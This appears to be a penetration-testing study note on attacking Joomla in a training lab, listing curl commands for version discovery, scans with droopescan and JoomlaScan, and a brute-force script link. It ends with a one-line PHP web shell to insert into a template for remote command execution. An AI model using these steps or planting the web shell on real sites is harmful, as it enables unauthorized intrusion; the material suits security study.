# Joomla Attacks

* get Joomla installs!

```shell-session
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
```

### Discovery/Footprinting

```shell-session
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

```shell-session
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

```shell-session
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

* The `cache.xml` file can help to give us the approximate version.

```
curl -s http://app.inlanefreight.local/plugins/system/cache/cache.xml | xmllint --format -
```

### Enumeration

* &#x20;try out [droopescan](https://github.com/droope/droopescan)

#### droopescan

```shell-session
sudo pip3 install droopescan
```

```shell-session
droopescan -h
```

```shell-session
droopescan scan joomla --url http://dev.inlanefreight.local/
```

#### JoomlaScan

* &#x20;We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool.

```
sudo python2.7 -m pip install urllib3

sudo python2.7 -m pip install certifi

sudo python2.7 -m pip install bs4
```

```shell-session
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

### brute-forcing

* The default administrator account on Joomla installs is `admin`,
  * but the password is set at install time
* We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.

## Attacking Joomla

* add to templated file

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
